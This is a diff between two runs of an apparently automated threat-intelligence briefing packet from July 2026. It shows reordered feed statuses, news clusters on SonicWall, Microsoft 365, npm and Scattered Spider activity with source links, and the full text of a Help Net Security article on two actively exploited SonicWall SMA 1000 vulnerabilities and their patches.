@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-15T05:38:35.447695+00:00
+- Generated: 2026-07-15T08:25:08.013560+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
-- Total items in window: 331
-- Total clusters raw: 165
-- Total clusters in packet: 76
-- Dropped low score: 89
+- Total items in window: 329
+- Total clusters raw: 166
+- Total clusters in packet: 75
+- Dropped low score: 91
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -70,26 +70,21 @@
 
 ## Feed status
 
-- **CrowdStrike** (threat_research_primary)
-  - URL: https://www.crowdstrike.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 1
+- **CrowdStrike** (threat_research_primary)
+  - URL: https://www.crowdstrike.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
@@ -100,41 +95,51 @@
   - Status: ok
   - Item count: 25
   - In window count: 0
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 5
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 5
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 0
+  - In window count: 2
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 2
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
@@ -145,16 +150,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 3
 - **Volexity** (threat_research_primary)
   - URL: https://www.volexity.com/feed/
   - Status: ok
@@ -170,6 +165,16 @@
   - Status: ok
   - Item count: 78
   - In window count: 0
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 3
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 0
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
@@ -179,11 +184,6 @@
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
-  - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: ok
-  - Item count: 50
   - In window count: 0
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
@@ -195,6 +195,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
@@ -202,11 +207,6 @@
   - In window count: 2
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -230,81 +230,86 @@
   - Status: ok
   - Item count: 30
   - In window count: 2
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 8
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - URL: https://orca.security/resources/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - URL: https://orca.security/resources/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 8
 - **Huntress** (detection_response_operations)
   - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
   - Item count: 100
-  - In window count: 8
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 5
-- **Protect AI** (ai_security_agentic_risk)
-  - URL: https://protectai.com/blog/rss.xml
+  - In window count: 7
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
   - Status: ok
   - Item count: 10
-  - In window count: 0
+  - In window count: 2
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Protect AI** (ai_security_agentic_risk)
+  - URL: https://protectai.com/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 5
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 6
 - **Cloudflare Security** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
-  - Item count: 20
-  - In window count: 16
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
+  - Item count: 100
+  - In window count: 6
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Interconnects** (ai_security_agentic_risk)
+  - URL: https://www.interconnects.ai/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 16
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
   - Status: ok
@@ -315,28 +320,18 @@
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **Interconnects** (ai_security_agentic_risk)
-  - URL: https://www.interconnects.ai/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 15
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -345,31 +340,31 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Dark Reading** (cyber_news_breach_reporting)
-  - URL: https://www.darkreading.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 26
 - **Simon Willison** (ai_security_agentic_risk)
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
   - Item count: 30
   - In window count: 22
+- **Dark Reading** (cyber_news_breach_reporting)
+  - URL: https://www.darkreading.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 26
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
@@ -385,16 +380,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
-  - Item count: 50
-  - In window count: 50
-- **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/cybersecurity/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
+  - Item count: 100
+  - In window count: 1
 - **Krebs on Security** (practitioner_analysis)
   - URL: https://krebsonsecurity.com/feed/
   - Status: ok
@@ -402,6 +392,11 @@
   - In window count: 3
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Reddit r/cybersecurity** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -415,13 +410,18 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -430,16 +430,16 @@
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - URL: https://www.infosecurity-magazine.com/rss/news/
+  - Status: ok
+  - Item count: 100
+  - In window count: 27
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - URL: https://www.infosecurity-magazine.com/rss/news/
-  - Status: ok
-  - Item count: 100
-  - In window count: 28
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -499,20 +499,21 @@
 - Anchor signal: SonicWall
 - Theme key: sonicwall
 - Cluster count: 4
-- Article count: 8
-- Cohesion: 0.356
+- Article count: 9
+- Cohesion: 0.345
 - Shared strong signals: SonicWall
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
   - threat_categories: zero_day, ransomware_extortion, data_breach, active_exploitation
-  - affected_industries: manufacturing_industrial, government, critical_infrastructure
+  - affected_industries: manufacturing_industrial, government
   - affected_products: SonicWall, Palo Alto Networks, Anthropic/Claude
   - urgency_signals: zero_day, no_patch_yet
 - Cluster IDs: 04c01d6fcc, 8c85eeaa7f, 55bab88c91, 5fab32b5e5
 - Links:
   - https://www.helpnetsecurity.com/2026/07/14/sonicwall-sma-attacks-via-cve-2026-15409-cve-2026-15410/
   - https://www.securityweek.com/sonicwall-issues-urgent-sma-patch-warning-for-two-zero-day-exploits/
+  - https://thehackernews.com/2026/07/two-sonicwall-sma-1000-zero-days.html
   - https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-flaws-exploited-in-zero-day-attacks-patch-now/
   - https://www.securityweek.com/7-severe-vulnerabilities-patched-in-vmware-avi-load-balancer/
   - https://www.securityweek.com/unpatched-claude-for-chrome-flaw-lets-extensions-read-gmail-calendar/
@@ -537,27 +538,6 @@
   - https://www.infosecurity-magazine.com/news/uat-7810-china-apt-orb-proxy/
   - https://blog.talosintelligence.com/video-where-protection-starts-cisco-talos-intelligence-integrations/
 
-### Microsoft Windows active exploitation
-- Anchor signal: Microsoft Windows
-- Theme key: microsoft-windows
-- Cluster count: 3
-- Article count: 4
-- Cohesion: 0.276
-- Shared strong signals: Microsoft Windows
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation
-  - affected_products: Microsoft Windows, Microsoft SharePoint
-  - cve_ids: CVE-2026-56155, CVE-2026-56164
-  - urgency_signals: actively_exploited
-- Cluster IDs: 8f654ac030, 3be6f6fab7, f3622fdee9
-- Links:
-  - https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
-  - https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/
-  - https://www.bleepingcomputer.com/news/microsoft/microsoft-releases-windows-10-kb5099539-extended-security-update/
-  - https://www.reddit.com/r/netsec/comments/1uqxlxq/drift_corpus_binary_diffs_of_240_2026_windows/
-
 ### ransomware extortion targeting Microsoft Defender
 - Anchor signal: Microsoft Defender
 - Theme key: microsoft-defender
@@ -577,24 +557,44 @@
   - https://www.microsoft.com/en-us/security/blog/2026/07/09/gigawiper-anatomy-of-a-destructive-backdoor-assembled-from-multiple-malware/
   - https://www.bleepingcomputer.com/news/security/progress-confirms-sharefile-zero-day-flaw-behind-storage-zone-shutdown/
 
-### Scattered Spider campaign activity
-- Anchor signal: Scattered Spider
-- Theme key: scattered-spider
-- Cluster count: 3
-- Article count: 3
-- Cohesion: 0.273
-- Shared strong signals: Scattered Spider
+### Apple iOS/macOS vulnerability activity
+- Anchor signal: Apple iOS/macOS
+- Theme key: apple-ios-macos
+- Cluster count: 2
+- Article count: 4
+- Cohesion: 0.2
+- Shared strong signals: Apple iOS/macOS
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - actor_attribution: Scattered Spider
-  - affected_industries: financial_services
-  - urgency_signals: preauth_unauth
-- Cluster IDs: ae25d6203b, f8c7235a08, 53ef47508e
+  - affected_products: Apple iOS/macOS
+- Cluster IDs: 598aa947b4, 480db84242
 - Links:
-  - https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
-  - https://www.intel471.com/blog/threat-hunting-case-study-scattered-spider
-  - https://thehackernews.com/2026/07/rabbitmq-flaws-could-leak-oauth-secrets.html
+  - https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit
+  - https://www.helpnetsecurity.com/2026/07/14/crashstealer-macos-infostealer-password-theft/
+  - https://thehackernews.com/2026/07/crashstealer-macos-malware-uses.html
+  - https://www.infosecurity-magazine.com/news/lidl-notifies-customers-of/
+
+### Microsoft 365 active exploitation
+- Anchor signal: Microsoft 365
+- Theme key: microsoft-365
+- Cluster count: 3
+- Article count: 7
+- Cohesion: 0.2
+- Shared strong signals: Microsoft 365
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: active_exploitation, phishing_social_eng
+  - affected_products: Microsoft 365
+  - urgency_signals: actively_exploited
+- Cluster IDs: 8d0224c08d, 83ac9f2074, 98dd5f4721
+- Links:
+  - https://www.recordedfuture.com/blog/june-2026-cve-landscape
+  - https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
+  - https://www.huntress.com/blog/conditional-access-misconfigurations
+  - https://www.bleepingcomputer.com/news/security/new-phishing-kits-target-microsoft-365-accounts-evade-mfa/
+  - https://thehackernews.com/2026/07/forg365-phaas-targets-microsoft-365.html
 
 ### ShinyHunters: supply chain
 - Anchor signal: ShinyHunters
@@ -614,27 +614,11 @@
   - https://thehackernews.com/2026/07/microsoft-maps-year-long-shinyhunters.html
   - https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
 
-### Google Cloud vulnerability activity
-- Anchor signal: Google Cloud
-- Theme key: google-cloud
-- Cluster count: 2
-- Article count: 2
-- Cohesion: 0.545
-- Shared strong signals: Google Cloud
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_products: Google Cloud
-- Cluster IDs: 5a4c062977, 480db84242
-- Links:
-  - https://cloud.google.com/blog/products/identity-security/introducing-k8s-aibom-on-gke-for-automated-ai-bills-of-materials/
-  - https://www.infosecurity-magazine.com/news/lidl-notifies-customers-of/
-
 ### supply chain targeting npm
 - Anchor signal: npm
 - Theme key: npm
 - Cluster count: 2
-- Article count: 7
+- Article count: 6
 - Cohesion: 0.2
 - Shared strong signals: npm
 - Member CVEs: (none)
@@ -646,27 +630,41 @@
 - Links:
   - https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
   - https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
-  - https://www.securityweek.com/multiple-jscrambler-packages-impacted-by-supply-chain-attack/
   - https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html
   - https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
 
-### CVE-2026-44747 exploitation activity
-- Anchor signal: CVE-2026-44747
-- Theme key: cve-2026-44747
+### Google Cloud vulnerability activity
+- Anchor signal: Google Cloud
+- Theme key: google-cloud
 - Cluster count: 2
 - Article count: 2
-- Cohesion: 0.2
-- Shared strong signals: CVE-2026-44747
+- Cohesion: 0.273
+- Shared strong signals: Google Cloud
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: active_exploitation
-  - cve_ids: CVE-2026-27690, CVE-2026-44747
-  - urgency_signals: actively_exploited
-- Cluster IDs: ae25d6203b, 4e6c87c16b
+  - affected_products: Google Cloud
+- Cluster IDs: 5a4c062977, 480db84242
 - Links:
+  - https://cloud.google.com/blog/products/identity-security/introducing-k8s-aibom-on-gke-for-automated-ai-bills-of-materials/
+  - https://www.infosecurity-magazine.com/news/lidl-notifies-customers-of/
+
+### Scattered Spider campaign activity
+- Anchor signal: Scattered Spider
+- Theme key: scattered-spider
+- Cluster count: 2
+- Article count: 2
+- Cohesion: 0.25
+- Shared strong signals: Scattered Spider
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - actor_attribution: Scattered Spider
+  - affected_industries: financial_services
+- Cluster IDs: f8c7235a08, ae25d6203b
+- Links:
+  - https://www.intel471.com/blog/threat-hunting-case-study-scattered-spider
   - https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
-  - https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
 
 ### CVE-2026-27690 exploitation activity
 - Anchor signal: CVE-2026-27690
@@ -686,28 +684,32 @@
   - https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
   - https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
 
-### Microsoft 365 vulnerability activity
-- Anchor signal: Microsoft 365
-- Theme key: microsoft-365
+### CVE-2026-44747 exploitation activity
+- Anchor signal: CVE-2026-44747
+- Theme key: cve-2026-44747
 - Cluster count: 2
-- Article count: 6
+- Article count: 2
 - Cohesion: 0.2
-- Shared strong signals: Microsoft 365
+- Shared strong signals: CVE-2026-44747
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - affected_products: Microsoft 365
-- Cluster IDs: 8d0224c08d, 98dd5f4721
+  - threat_categories: active_exploitation
+  - cve_ids: CVE-2026-27690, CVE-2026-44747
+  - urgency_signals: actively_exploited
+- Cluster IDs: ae25d6203b, 4e6c87c16b
 - Links:
-  - https://www.recordedfuture.com/blog/june-2026-cve-landscape
-  - https://www.huntress.com/blog/conditional-access-misconfigurations
-  - https://www.bleepingcomputer.com/news/security/new-phishing-kits-target-microsoft-365-accounts-evade-mfa/
-  - https://thehackernews.com/2026/07/forg365-phaas-targets-microsoft-365.html
+  - https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
+  - https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
 
 ## Forward signals
 
 ### Novelty
-- Novel cves: 0
+- Novel cves: 4
+  - CVE-2026-15718 (first seen via SecurityWeek at 2026-07-15T07:24:52+00:00, cluster 83ac9f2074)
+  - CVE-2026-15719 (first seen via SecurityWeek at 2026-07-15T07:24:52+00:00, cluster 83ac9f2074)
+  - CVE-2026-15764 (first seen via SecurityWeek at 2026-07-15T07:24:52+00:00, cluster 83ac9f2074)
+  - CVE-2026-15765 (first seen via SecurityWeek at 2026-07-15T07:24:52+00:00, cluster 83ac9f2074)
 - Novel actors: 0
 - Novel products: 0
 
@@ -732,7 +734,7 @@
 - Pair: CVE-2026-56155 + Cisco (cluster 8f654ac030, first observation: True)
 - Pair: CVE-2026-56155 + Microsoft SharePoint (cluster 8f654ac030, first observation: True)
 
-### Drift (2)
+### Drift (3)
 - **ShinyHunters** (cluster 7df2f246d4)
   - New industries: manufacturing_industrial, retail_ecommerce
   - New products: Microsoft Defender
@@ -743,12 +745,17 @@
   - New products: PyPI
   - Prior top industries: financial_services, government, healthcare
   - Prior top products: GitHub, Kubernetes, npm
+- **Scattered Spider** (cluster f8c7235a08)
+  - New industries: critical_infrastructure, manufacturing_industrial, telecommunications
+  - New products: ScreenConnect
+  - Prior top industries: financial_services, government, healthcare
+  - Prior top products: Anthropic/Claude, Apple iOS/macOS, Microsoft SharePoint
 
 ### Persistence (8)
 - actor_attribution: ShinyHunters (weeks observed: 7, cluster 7df2f246d4)
 - actor_attribution: TeamPCP (weeks observed: 6, cluster 86ef70edb1)
 - cve_ids: CVE-2026-20230 (weeks observed: 5, cluster 8e87b71464)
-- actor_attribution: Scattered Spider (weeks observed: 5, cluster ae25d6203b)
+- actor_attribution: Scattered Spider (weeks observed: 5, cluster f8c7235a08)
 - cve_ids: CVE-2026-47729 (weeks observed: 3, cluster 8e87b71464)
 - cve_ids: CVE-2025-5777 (weeks observed: 3, cluster aaaf47b0ea)
 - cve_ids: CVE-2025-3248 (weeks observed: 3, cluster c8e0a6559d)
@@ -962,15 +969,15 @@ A critical vulnerability ( CVE-2026-48282 , CVSS 10.0) was disclosed affecting A
   - Link: https://orca.security/resources/blog/adobe-coldfusion-rce-flaw-cve-2026-48282/
   - Summary: A critical vulnerability (CVE-2026-48282, CVSS 10.0) was disclosed affecting Adobe ColdFusion, allowing attackers to achieve full remote code execution via a path traversal in the Remote Development Services (RDS) FILEIO handler. Due to the potential for complete server compromise and the confirmed in-the-wild exploitation, immediate patching is required. About CVE-2026-48282 The issue originates from the […]
 
-### Cluster 04c01d6fcc — score 28
+### Cluster 04c01d6fcc — score 27
 
 - Title: SonicWall SMA appliances targeted in zero-day attacks (CVE-2026-15409, CVE-2026-15410)
 - Source: Help Net Security (cyber_news_breach_reporting)
 - Published: 2026-07-14T17:40:10+00:00
 - Link: https://www.helpnetsecurity.com/2026/07/14/sonicwall-sma-attacks-via-cve-2026-15409-cve-2026-15410/
 - Fetch status: ok
-- Member count: 3
-- Corroborating source count: 3
+- Member count: 4
+- Corroborating source count: 4
 - Strong signals: CVE-2026-15409, CVE-2026-15410, SonicWall
 
 #### Cluster taxonomy (union across members)
@@ -1000,10 +1007,10 @@ SonicWall has fixed two actively exploited vulnerabilities (CVE-2026-15409, CVE-
 #### Full body
 
 ```
-Zeljka Zorz , Editor-in-Chief, Help Net Security July 14, 2026 Share SonicWall SMA appliances targeted in zero-day attacks (CVE-2026-15409, CVE-2026-15410) SonicWall has fixed two actively exploited vulnerabilities (CVE-2026-15409, CVE-2026-15410) affecting its Secure Mobile Access (SMA) 1000 Series appliances, and is urging customer organizations to upgrade to a fixed firmare version and search for evidence of potential compromise. If the outlined indicators of compromise are present on the system, the company advises re-imaging (hardware) or re-deploying (virtual) appliances, changing user and administrator passwords, and resetting TOTP tokens . The vulnerabilities SonicWall SMA 1000 series appliances are secure remote access (SSL VPN) gateways designed for medium-to-large businesses, multinationals, government agencies, and managed security service providers. CVE-2026-15409 is a critical server-side request forgery (SSRF) flaw in the SMA1000 Appliance Work Place interface, which may allow remote unauthenticated attackers to “cause the appliance to make requests to unintended location.” The high-severity code injection flaw in the SMA1000 Appliance Management Console ( CVE-2026-15410 ) may allow remote attackers authenticated as an admin to execute arbitrary OS commands and achieve remote code execution. In attacks observed so far, the two bugs are being exploited in tandem. “We have confirmed that these vulnerabilities are being actively exploited in the wild and are not unique to SonicWall,” a company spokesperson told us, and said that upon discovery, the company investigated the issue, developed and released a firmware patch, and notified impacted customers. SonicWall sent an alert to customers in advance of the publication of the security advisory, advising them to get in touch with SonicWall Support to receive the hotfixes (v12.4.3-03453 and 12.5.0-02835) before they are made available to the company site on July 14, 2026. The company also developed a script they can run on behalf of affected customers to assist with resolution, and mitigation efforts are already underway, the spokesperson added. “Our support team is assisting customers through instances of suspicious activity on a case-by-case basis.” Patching alone is not sufficient SonicWall SMA appliances and firewalls are often targeted by attackers, sometimes by exploiting zero-day , other times by leveraging old , previously known vulnerabilities . CVE-2026-15409 and CVE-2026-15410 affect SonicWall’s SMA6210, SMA7210, and SMA8200v appliances. Affected firmware (platform-hotfix) versions are: 12.4.3-03245 12.4.3-03387 12.4.3-03434 12.5.0-02283 12.5.0-02624 12.5.0-02800 “It is important that customers understand patching alone is not sufficient. Even after applying the update, we strongly recommend reviewing logs for indicators of compromise and following the guidance in our KB article closely,” the spokesperson stressed. Adam Babis of SonicWall PSIRT has been credited with discovering and reporting the two vulnerabilities. Subscribe to our breaking news e-mail alert to never miss out on the latest breaches, vulnerabilities and cybersecurity threats. Subscribe here! More about 0-day CVE enterprise government secure access SonicWall Share
